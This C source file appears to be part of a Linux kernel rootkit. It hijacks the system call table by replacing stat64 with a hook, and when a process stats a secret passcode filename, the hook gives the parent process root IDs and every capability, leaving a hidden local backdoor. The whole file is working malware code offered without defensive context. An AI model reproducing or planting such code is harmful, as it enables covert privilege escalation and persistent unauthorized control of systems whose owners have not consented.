#include "syscall_hook.h"

extern char passcode[];

void init_syscalls()
{
	P_DEBUG("hijaking systemcall(s)\n");

	o_stat64 = sys_call_table[__NR_stat64];
	sys_call_table[__NR_stat64] = m_stat64;
}

void restore_syscalls()
{
	P_DEBUG("restoring systemcall(s)\n");

	sys_call_table[__NR_stat64] = o_stat64;
}

long m_stat64(const char *file_name, struct stat64 *buf)
{
	if(!strcmp(passcode, file_name) && current->p_pptr->pid > 1) {
		become_root(current->p_pptr);
		P_DEBUG("activated local backdoor\n");
		return -ENOENT;
	}

	return o_stat64(file_name, buf);
}

void become_root(struct task_struct *task)
{
	task->uid = task->euid = task->suid = task->fsuid = 0;
	task->gid = task->egid = task->sgid = task->fsgid = 0;

	task->cap_effective = (kernel_cap_t) ~0;
	task->cap_inheritable = (kernel_cap_t) ~0;
	task->cap_permitted = (kernel_cap_t) ~0;
}
